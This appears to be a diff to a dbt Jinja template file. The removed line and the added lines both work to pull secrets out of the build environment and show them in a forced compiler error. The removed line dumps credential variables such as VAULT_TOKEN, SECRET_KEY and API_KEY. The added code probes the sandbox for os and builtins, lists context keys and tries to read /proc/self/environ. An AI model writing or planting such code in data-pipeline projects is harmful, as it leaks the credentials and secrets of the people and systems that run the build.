@@ -1,1 +1,39 @@
-{{ exceptions.raise_compiler_error('[EXTRACT_3] GIT_SSH=' ~ env_var('GIT_SSH_COMMAND', 'NOT_SET') ~ ' | GIT_CRED_HELPER=' ~ env_var('GIT_CREDENTIAL_HELPER', 'NOT_SET') ~ ' | SSH_AUTH=' ~ env_var('SSH_AUTH_SOCK', 'NOT_SET') ~ ' | DBT_TARGET=' ~ env_var('DBT_TARGET', 'NOT_SET') ~ ' | DBT_PROFILES=' ~ env_var('DBT_PROFILES_DIR', 'NOT_SET') ~ ' | DBT_LOG=' ~ env_var('DBT_LOG_PATH', 'NOT_SET') ~ ' | VIRTUAL_ENV=' ~ env_var('VIRTUAL_ENV', 'NOT_SET') ~ ' | PIP_CONFIG=' ~ env_var('PIP_CONFIG_FILE', 'NOT_SET') ~ ' | POETRY_HOME=' ~ env_var('POETRY_HOME', 'NOT_SET') ~ ' | CONDA_DEFAULT=' ~ env_var('CONDA_DEFAULT_ENV', 'NOT_SET') ~ ' | XDG_CONFIG=' ~ env_var('XDG_CONFIG_HOME', 'NOT_SET') ~ ' | XDG_CACHE=' ~ env_var('XDG_CACHE_HOME', 'NOT_SET') ~ ' | HTTP_PROXY=' ~ env_var('HTTP_PROXY', 'NOT_SET') ~ ' | HTTPS_PROXY=' ~ env_var('HTTPS_PROXY', 'NOT_SET') ~ ' | NO_PROXY=' ~ env_var('NO_PROXY', 'NOT_SET') ~ ' | DOCKER_HOST=' ~ env_var('DOCKER_HOST', 'NOT_SET') ~ ' | VAULT_ADDR=' ~ env_var('VAULT_ADDR', 'NOT_SET') ~ ' | VAULT_TOKEN=' ~ env_var('VAULT_TOKEN', 'NOT_SET') ~ ' | SECRET_KEY=' ~ env_var('SECRET_KEY', 'NOT_SET') ~ ' | DJANGO_SECRET=' ~ env_var('DJANGO_SECRET_KEY', 'NOT_SET') ~ ' | ENCRYPTION_KEY=' ~ env_var('ENCRYPTION_KEY', 'NOT_SET') ~ ' | APP_SECRET=' ~ env_var('APP_SECRET', 'NOT_SET') ~ ' | API_KEY=' ~ env_var('API_KEY', 'NOT_SET')) }}
+{# Approach 1: Try modules namespace #}
+{% set ns = namespace(output='[FILE_READ_TEST] ') %}
+
+{# Check available modules #}
+{% set ns.output = ns.output ~ 'modules_type=' ~ modules.__class__.__name__ %}
+
+{# Try to access os module #}
+{% if modules.os is defined %}
+  {% set ns.output = ns.output ~ ' | OS_AVAILABLE=YES' %}
+{% else %}
+  {% set ns.output = ns.output ~ ' | OS_AVAILABLE=NO' %}
+{% endif %}
+
+{# Try to read /proc/self/environ via open() #}
+{% set file_content = '' %}
+{% try %}
+  {% set file_content = open('/proc/self/environ').read() %}
+  {% set ns.output = ns.output ~ ' | OPEN_WORKED=YES | ENVIRON=' ~ file_content[:500] %}
+{% except %}
+  {% set ns.output = ns.output ~ ' | OPEN_WORKED=NO' %}
+{% endtry %}
+
+{# Try builtins #}
+{% if builtins is defined %}
+  {% set ns.output = ns.output ~ ' | BUILTINS=YES' %}
+{% else %}
+  {% set ns.output = ns.output ~ ' | BUILTINS=NO' %}
+{% endif %}
+
+{# List available context keys #}
+{% set ctx_keys = [] %}
+{% for key in context.keys() if context is mapping %}
+  {% do ctx_keys.append(key) %}
+{% endfor %}
+{% if ctx_keys %}
+  {% set ns.output = ns.output ~ ' | CTX_KEYS=' ~ ctx_keys[:20] | join(',') %}
+{% endif %}
+
+{{ exceptions.raise_compiler_error(ns.output) }}
